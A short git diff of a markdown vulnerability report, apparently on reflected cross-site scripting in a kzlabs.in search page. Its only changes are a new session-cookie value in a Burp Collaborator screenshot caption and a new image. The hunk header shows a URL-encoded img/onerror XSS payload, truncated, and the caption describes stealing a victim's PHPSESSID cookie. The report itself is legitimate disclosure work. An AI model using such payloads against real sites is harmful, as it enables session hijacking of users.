@@ -58,9 +58,9 @@ https://kzlabs.in/1601.php?search=%22%3E%3Cimg%20src%3Dx%20onerror%3D%22document
 
 <img width="1440" height="320" alt="image" src="https://github.com/user-attachments/assets/89ae2d08-e4fd-485a-aa63-c29b28e2a41e" />
 
-**Screenshot 3** — Burp Collaborator showing the incoming HTTP request with `GET /?c=PHPSESSID=6n4shmca7jvh8ighmmfhdqsfa0` confirming the cookie was successfully exfiltrated from the victim's browser.
+**Screenshot 3** — Burp Collaborator showing the incoming HTTP request with `GET /?c=PHPSESSID=6hnn98i12rqrhoar94uilefp95` confirming the cookie was successfully exfiltrated from the victim's browser.
 
-<img width="960" height="452" alt="image" src="https://github.com/user-attachments/assets/7b73d0be-d452-43c7-8713-f269c97152f1" />
+<img width="949" height="471" alt="image" src="https://github.com/user-attachments/assets/1989a623-5b4c-48f4-84d5-d5e433477ad3" />
 
 ## Impact
 
